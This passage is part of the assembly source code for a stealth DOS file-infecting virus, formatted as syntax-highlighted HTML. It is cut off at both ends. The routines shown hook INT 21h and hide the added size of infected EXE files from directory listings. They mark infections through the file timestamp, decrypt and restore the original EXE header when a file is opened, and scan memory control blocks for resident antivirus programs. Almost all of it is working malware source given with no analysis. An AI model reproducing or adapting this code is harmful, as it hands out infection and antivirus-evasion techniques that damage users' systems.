                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">; Get DTA</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">                 </span><span class="sc1">; Extended FCB?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_ext_fcb</span><span class="sc0">              </span><span class="sc1">; No, no add</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; Yea, add 7</span><span class="sc0">
</span><span class="sc5">no_ext_fcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">                  </span><span class="sc1">; Point DI on FileTime</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1Dh</span><span class="sc0">                  </span><span class="sc1">; Point SI on FileSize</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mask_time</span><span class="sc0">               </span><span class="sc1">; Check if infected and</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; stealth size if it is</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exit_11_12</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                </span><span class="sc1">; Interrupt return</span><span class="sc0">

</span><span class="sc1">; mask_time will be called by both 11h/12h and 4Eh/4Fh stealth routines.</span><span class="sc0">
</span><span class="sc1">; It assumes that es:[di] points on file time and es:[si] on filesize.</span><span class="sc0">
</span><span class="sc1">; It will check the timestamp and, if the file will seem infected, will</span><span class="sc0">
</span><span class="sc1">; hide the size. The foo bytes at the tail of the host are calculated</span><span class="sc0">
</span><span class="sc1">; in the same way as before in the infection stage.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">mask_time</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; File time in AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; File time in BX</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">            </span><span class="sc1">; AND ax,1fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">            </span><span class="sc1">; XOR ax,05h</span><span class="sc0">

                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">it_isnt_infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; Get amount of garbage</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; from the File Time</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Smaller than 64k ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">substract_lenght</span><span class="sc0">        </span><span class="sc1">; No, so no second check</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">1388h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">it_isnt_infected</span><span class="sc0">        </span><span class="sc1">; We don't infect files</span><span class="sc0">
                                                </span><span class="sc1">; smaller than 5000 bytes</span><span class="sc0">
</span><span class="sc5">substract_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">virus_lenght_file</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; Hide virus lenght</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">it_isnt_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">mask_time</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; int_open_stealth is the stealth routine on OPEN (3Dh and 6Ch for extended</span><span class="sc0">
</span><span class="sc1">; open). The virus will reput the original header and delete the virus</span><span class="sc0">
</span><span class="sc1">; body at the end of the host.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int_open_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; Save regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc0">                  </span><span class="sc1">; Extended open?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">normal_open</span><span class="sc0">             </span><span class="sc1">; No, normal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; Yea, so put right register</span><span class="sc0">
</span><span class="sc5">normal_open</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_default_dr</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dfl_dr_ok</span><span class="sc0">               </span><span class="sc1">; Jump if drive &gt; B:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_open_end</span><span class="sc0">
</span><span class="sc5">dfl_dr_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stealth_enabled</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ste_enabled</span><span class="sc0">             </span><span class="sc1">; Jump if not stealthing</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_open_end</span><span class="sc0">
</span><span class="sc5">ste_enabled</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                </span><span class="sc1">; Open file in RO mode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_opening</span><span class="sc0">              </span><span class="sc1">; Continue if no errors</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_open_end</span><span class="sc0">
</span><span class="sc5">ok_opening</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; File handle in BX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">   </span><span class="sc1">; Is an exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int_open_end_wc</span><span class="sc0">         </span><span class="sc1">; If not leave</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_filetime</span><span class="sc0">          </span><span class="sc1">; Our timestamp?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">int_open_end_wc</span><span class="sc0">         </span><span class="sc1">; If not leave</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">lenght_ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Store file size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">lenght_dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">modify_time</span><span class="sc0">             </span><span class="sc1">; Here the virus gets</span><span class="sc0">
                                                </span><span class="sc1">; from the time how many</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">; foo bytes have been put</span><span class="sc0">
                                                </span><span class="sc1">; Add also 1Ch so we will</span><span class="sc0">
                                                </span><span class="sc1">; point to the encrypted</span><span class="sc0">
                                                </span><span class="sc1">; original EXE header</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; Substract the foo bytes</span><span class="sc0">
                                                </span><span class="sc1">; and the offset of the</span><span class="sc0">
                                                </span><span class="sc1">; encrypted EXE header</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; from the filesize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Put current offset in file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; to our encrypted original</span><span class="sc0">
                                                </span><span class="sc1">; EXE header</span><span class="sc0">
                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">head_buffer</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_header</span><span class="sc0">             </span><span class="sc1">; Read encrypted EXE header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">int_open_end_wc</span><span class="sc0">         </span><span class="sc1">; Exit on error</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_header</span><span class="sc0">          </span><span class="sc1">; Decrypt the EXE header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">       </span><span class="sc1">; Seems ok?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int_open_end_wc</span><span class="sc0">         </span><span class="sc1">; If not exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_woff</span><span class="sc0">               </span><span class="sc1">; Go to file start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_header</span><span class="sc0">            </span><span class="sc1">; Write the orignal header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">int_open_end_wc</span><span class="sc0">         </span><span class="sc1">; Exit on error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenght_ax</span><span class="sc0">            </span><span class="sc1">; Get file lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">lenght_dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">modify_time</span><span class="sc0">             </span><span class="sc1">; Calculate foo bytes in CX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_lenght_file</span><span class="sc0">    </span><span class="sc1">; Add virus lenght</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; Substract virus size from</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; file lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; DO IT!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Write to file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; CX=0, truncate file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; Go</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; Set file time/date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_time</span><span class="sc0">            </span><span class="sc1">; Get original time/date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_date</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; Set original time/date</span><span class="sc0">
</span><span class="sc5">int_open_end_wc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; Close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">
</span><span class="sc5">int_open_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; Pop flags</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">jmp_to_old_int21h</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">fir_int21_offset</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">fir_int21_segment</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; tsr_av_check walks trought the memory control blocks and check if there</span><span class="sc0">
</span><span class="sc1">; is an AV active in memory.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">tsr_av_check</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                  </span><span class="sc1">; Get List of the Lists</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Push segment of the first</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; MCB</span><span class="sc0">
</span><span class="sc5">mcb_checking</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">       </span><span class="sc1">; Isn't last block?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_mem</span><span class="sc0">             </span><span class="sc1">; It isn't, so jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">       </span><span class="sc1">; Is last block?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_av_mem_check</span><span class="sc0">       </span><span class="sc1">; No, jump away</span><span class="sc0">
</span><span class="sc5">examine_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">av_mem_names</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Point on TSR AV table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; 3 TSR AV in our table</span><span class="sc0">

</span><span class="sc5">mem_check_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get program name</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; It is equal than our AV?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">continue_next_av</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Check the third char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_av_mem_check</span><span class="sc0">       </span><span class="sc1">; There is an AV in mem!</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">                  </span><span class="sc1">; Wildcard in our table?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_av_mem_check</span><span class="sc0">       </span><span class="sc1">; So assume AV present!</span><span class="sc0">
</span><span class="sc5">continue_next_av</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">mem_check_loop</span><span class="sc0">          </span><span class="sc1">; Loop if cx &gt; 0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Add Memory Block size</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; On the next MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Examine it!</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">mcb_checking</span><span class="sc0">

</span><span class="sc5">exit_av_mem_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">tsr_av_check</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">get_sft</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                </span><span class="sc1">; Get JFT entry</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
                                                </span><span class="sc1">; ES:DI -&gt; JFT entry</span><span class="sc0">
                                                </span><span class="sc1">; for file handle in</span><span class="sc0">
                                                </span><span class="sc1">; current process</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; BL = SFT entry number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                </span><span class="sc1">; Get address of SFT</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; Set RW mode to file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">get_sft</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">get_default_dr</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">                  </span><span class="sc1">; Get current default</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; drive</span><span class="sc0">
